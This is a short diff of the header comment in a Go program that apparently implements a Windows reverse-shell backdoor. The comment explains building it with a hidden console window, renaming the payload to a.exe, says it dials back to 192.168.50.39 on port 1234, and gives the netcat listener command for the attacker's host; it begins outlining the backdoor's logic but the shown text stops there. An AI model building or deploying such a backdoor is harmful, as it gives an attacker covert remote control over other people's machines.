@@ -1,7 +1,10 @@
 package main
 
 /* 
-Build with go build -ldflags -H=windowsgui payload.go
+Build with go build -ldflags -H=windowsgui WindowsReverseShell.go
+Rename the payload to a.exe
+Payload dials back to 192.168.50.39 on port 1234 on line 100
+For the host, currently you can use "nc -nlvp 1234" (Linux host)
 
 Backdoor logic as of now:
 Checks to see if the program is in C drive
